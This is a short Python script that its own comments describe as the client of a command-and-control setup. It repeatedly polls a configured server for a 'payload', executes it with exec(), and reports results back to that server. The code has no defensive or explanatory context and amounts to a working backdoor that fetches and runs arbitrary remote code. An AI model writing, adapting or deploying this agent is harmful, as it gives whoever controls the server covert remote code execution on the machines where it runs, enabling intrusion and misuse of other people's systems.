COMMAND_HOST="http://127.0.0.1:8999"#Command and control server, where the server.py is running WITHOUT THE SLASH AFTER HOSTNAME
REQUESTS_DELAY=1 # make a request every REQUESTS_DELAY seconds
REPORT_RESULTS=True #Will it report results back?
REQ_FAILED_TIME_WAIT=10#How much time to wait if request to server failed.
PAYLOAD_ROUTE="/not-payload-url"
RESULTS_ROUTE="/results"
DO_REQUESTS_CHECK=False

if DO_REQUESTS_CHECK:
	import os

	os.system("python -m ensurepip")
	os.system("pip install requests")

import requests
import time
import json

def send_message(m):
	requests.post(COMMAND_HOST+RESULTS_ROUTE, data=m)

while True:
	try:
		r = requests.get(COMMAND_HOST+PAYLOAD_ROUTE)
		data = r.json()
	except Exception as e:
		print(e)
		time.sleep(REQ_FAILED_TIME_WAIT)
		continue
	try:
		exec(data["payload"])
		if REPORT_RESULTS: requests.post(COMMAND_HOST+RESULTS_ROUTE, data="Everything is ok.")
	except Exception as e:
		if REPORT_RESULTS: requests.post(COMMAND_HOST+RESULTS_ROUTE, data=str(e))
	if data["exec_once"]:
		break
	time.sleep(REQUESTS_DELAY)
